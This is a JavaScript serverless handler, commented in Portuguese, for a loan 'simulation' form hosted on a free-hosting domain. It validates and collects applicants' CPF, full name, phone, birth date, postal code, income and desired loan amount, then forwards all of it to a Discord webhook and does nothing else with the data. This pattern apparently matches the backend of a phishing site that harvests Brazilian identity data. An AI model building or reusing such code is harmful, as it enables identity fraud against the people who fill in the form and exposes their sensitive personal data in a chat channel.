// api/upload-simulacao.js - Proxy para envio de simulação sem uploads (apenas campos de texto) + Discord
import formidable from 'formidable';

export default async function handler(req, res) {
    // Configuração de CORS manual (mesmo domínio do primeiro form)
    const allowedOrigin = 'https://emprestimo-simonetti.wuaze.com';  // <-- SUBSTITUA PELO SEU DOMÍNIO EXATO NO INFINITYFREE
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');

    // Handle preflight OPTIONS request
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Só permite POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Parse FormData com formidable (apenas campos de texto, sem arquivos)
    const form = formidable({
        multiples: false,  // Não precisamos de múltiplos arquivos
        keepExtensions: false,  // Não processa extensões de arquivos
        // Não definimos uploadDir, pois não há arquivos
    });

    let fields;
    try {
        [fields] = await form.parse(req);
    } catch (error) {
        console.error('Erro no formidable:', error);
        return res.status(400).json({ error: 'Erro ao processar o formulário.' });
    }

    // Extrai campos de texto (agora com os novos campos do formulário)
    const cpf = fields.cpf ? fields.cpf[0] : null;
    const nomeCompleto = fields.nomeCompleto ? fields.nomeCompleto[0] : null;
    const celular = fields.celular ? fields.celular[0] : null;
    const dataNascimento = fields.dataNascimento ? fields.dataNascimento[0] : null;
    const cep = fields.cep ? fields.cep[0] : null;
    const rendaMensal = fields.rendaMensal ? fields.rendaMensal[0] : null;
    const tipoRenda = fields.tipoRenda ? fields.tipoRenda[0] : null;
    const valorDesejado = fields.valorDesejado ? fields.valorDesejado[0] : null;

    const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;

    // Validação de campos obrigatórios (todos os novos campos)
    if (!cpf || !nomeCompleto || !celular || !dataNascimento || !cep || !rendaMensal || !tipoRenda || !valorDesejado || !DISCORD_WEBHOOK_URL4) {
        return res.status(400).json({ error: 'Dados incompletos: Todos os campos são obrigatórios (CPF, Nome Completo, Celular, Data de Nascimento, CEP, Renda Mensal, Tipo de Renda e Valor Desejado).' });
    }

    // Validação CPF (11 dígitos)
    if (cpf.replace(/\D/g, '').length !== 11) {
        return res.status(400).json({ error: 'CPF inválido: deve ter 11 dígitos.' });
    }

    // Validação simples de CEP (8 dígitos)
    if (cep.replace(/\D/g, '').length !== 8) {
        return res.status(400).json({ error: 'CEP inválido: deve ter 8 dígitos.' });
    }

    // Validação de renda e valor desejado (devem ser numéricos > 0)
    const rendaNum = parseFloat(rendaMensal.replace(/\D/g, ''));
    const valorNum = parseFloat(valorDesejado.replace(/\D/g, ''));
    if (isNaN(rendaNum) || rendaNum <= 0) {
        return res.status(400).json({ error: 'Renda mensal inválida: deve ser um valor maior que R$ 0,00.' });
    }
    if (isNaN(valorNum) || valorNum <= 0) {
        return res.status(400).json({ error: 'Valor desejado inválido: deve ser um valor maior que R$ 0,00.' });
    }

    // Validação de tipo de renda (apenas as opções permitidas)
    const tiposValidos = ['assalariada', 'autonoma', 'aposentada'];
    if (!tiposValidos.includes(tipoRenda)) {
        return res.status(400).json({ error: 'Tipo de renda inválido: deve ser Assalariada, Autônoma ou Aposentada.' });
    }

    // Validação de data de nascimento (maior de 18 anos)
    const birthDate = new Date(dataNascimento);
    const today = new Date();
    let age = today.getFullYear() - birthDate.getFullYear();
    const monthDiff = today.getMonth() - birthDate.getMonth();
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) age--;
    if (age < 18) {
        return res.status(400).json({ error: 'Idade inválida: Você deve ter pelo menos 18 anos.' });
    }

    // Validação de celular (pelo menos 10 dígitos)
    if (celular.replace(/\D/g, '').length < 10) {
        return res.status(400).json({ error: 'Celular inválido: deve ter pelo menos 10 dígitos.' });
    }

    // Validação de nome completo (pelo menos 2 caracteres)
    if (nomeCompleto.length < 2) {
        return res.status(400).json({ error: 'Nome completo inválido: deve ter pelo menos 2 caracteres.' });
    }

    try {
        // Notificação para Discord (sem links de arquivos)
        const discordPayload = {
            username: 'Nova Simulação de Empréstimo',
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/181/181095.png', // Ícone genérico
            embeds: [
                {
                    title: 'Nova Simulação Recebida!',
                    description: `Uma nova simulação de empréstimo foi preenchida com sucesso.`,
                    color: 13706550, // Um tom de vermelho para combinar com o site
                    fields: [
                        { name: 'CPF', value: cpf, inline: true },
                        { name: 'Nome Completo', value: nomeCompleto, inline: false },
                        { name: 'Celular', value: celular, inline: true },
                        { name: 'Data de Nascimento', value: dataNascimento, inline: true },
                        { name: 'CEP', value: cep, inline: true },
                        { name: 'Renda Mensal', value: rendaMensal, inline: true },
                        { name: 'Tipo de Renda', value: tipoRenda.charAt(0).toUpperCase() + tipoRenda.slice(1), inline: true }, // Capitaliza para melhor visualização
                        { name: 'Valor Desejado', value: valorDesejado, inline: true },
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Simulação via Vercel Proxy (Sem Documentos)' },
                },
            ],
        };

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL4, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });

        if (!discordResponse.ok) {
            const errorText = await discordResponse.text();
            console.error('Falha no Discord:', errorText);
            // Continua, pois processamento OK (pode logar o erro, mas não falha o response)
        }

        // Resposta de sucesso (sem links de arquivos)
        res.status(200).json({ 
            success: true, 
            message: 'Simulação enviada com sucesso!' 
        });

    } catch (error) {
        console.error('Erro no upload-simulacao:', error);
        res.status(500).json({ error: 'Erro interno no servidor: ' + error.message });
    }
}

export const config = {
    api: {
        bodyParser: false,  // Essencial para multipart/form-data (mesmo sem arquivos, JS envia FormData)
    },
};
